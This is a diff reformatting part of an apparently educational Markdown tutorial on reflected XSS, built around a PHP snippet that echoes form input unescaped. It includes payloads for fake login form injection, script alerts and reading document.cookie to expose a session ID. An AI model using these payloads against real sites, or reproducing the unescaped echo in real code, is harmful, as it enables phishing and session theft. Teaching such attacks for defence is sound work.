@@ -276,9 +276,7 @@ Payload:
 - lastname: `<u>Doe</u>`
 - Output: `Hello John Doe!`
 
-## XSS Reflected
-
-Form Injection
+## XSS Reflected - Form Injection
 
 By adding custom HTML, we can try and go for a Phishing Attack
 
@@ -304,24 +302,41 @@ Payload:
 - Output:    `Hello [ Fake login form ]!`
 
 
-Read GET parameters - EXPLOIT
-XSS Reflected
-That was nice, but let's see how far we can go!
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
-Payload:
-firstname:		John
-lastname:		Doe<script>alert(1)</script>
-Output: 		Hello John Doe[ … popup appears saying “1” … ]!		
+## XSS Reflected - injecting and executing javascript
 
-Read GET parameters - EXPLOIT
-XSS Reflected
-That “1” wasn't so exciting, is there anything important we can display from the DOM?
-Remember your “HTTP is Stateless” mantra? What makes it Stateful?
-Code: 			$firstname = $_POST['firstname'];				$lastname = $_POST['lastname'];				echo “Hello $firstname $lastname!”;
+That was nice, but let's see how far we can go!
+
+Code: 			
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+
 Payload:
-firstname:		John
-lastname:		Doe<script>alert(document.cookie)</script>
-Output: 		Hello John Doe[ … popup appears saying “PHPSESSID=badf00d...” … ]!		
+
+- firstname: `John`
+- lastname:	`Doe<script>alert(1)</script>`
+- Output: `Hello John Doe[ ... popup appears saying "1" ... ]!`
+
+## XSS Reflected - injecting and executing javascript
+
+That “1” wasn't so exciting, is there anything important we can display from the DOM?
+
+Remember the "HTTP is Stateless" mantra? What makes it Stateful?
+
+Code: 			
+```
+$firstname = $_POST['firstname'];
+$lastname = $_POST['lastname'];
+echo “Hello $firstname $lastname!”;
+```
+
+Payload:
+
+- firstname: `John`
+- lastname:	`Doe<script>alert(document.cookie)</script>`
+- Output: `Hello John Doe[ ... popup appears saying "PHPSESSID=badf00d..." ... ]!`
 
 Read GET parameters - EXPLOIT
 XSS Reflected
